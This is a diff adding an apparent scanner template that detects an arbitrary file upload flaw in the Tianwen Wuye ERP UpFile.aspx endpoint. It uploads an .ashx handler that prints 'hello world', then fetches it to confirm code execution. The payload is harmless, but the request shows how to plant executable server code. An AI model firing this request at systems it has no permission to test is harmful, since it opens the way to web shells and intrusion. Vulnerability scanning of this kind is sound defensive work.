@@ -1,0 +1,63 @@
+id: tianwen-wuye-erp-upfile-upload
+info:
+  name: Tianwen Wuye ERP Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Tianwen Wuye ERP system is vulnerable to arbitrary file upload via the UpFile.aspx endpoint, allowing attackers to upload malicious files.
+
+variables:
+  filepath: ""
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/HM/M_Main/UpLoad/UpFile.aspx"
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: |
+      --00content0boundary00
+      Content-Disposition: form-data; name="UpFileData"; filename="1.ashx"
+
+      <% @ webhandler language="C#" class="AverageHandler" %>
+      using System;
+      using System.Web;
+
+      public class AverageHandler : IHttpHandler
+      {
+          public bool IsReusable
+          {
+            get {
+              return true;
+            }
+          }
+          public void ProcessRequest(HttpContext ctx)
+          {
+            ctx.Response.Write("hello world");
+          }
+      }
+      --00content0boundary00--
+
+    extractors:
+      - type: regex
+        name: filepath
+        part: body
+        internal: true
+        regex:
+          - '(?i)(http[s]?://[^/]+(/[^?\s]*))'
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}{{filepath}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "hello world"
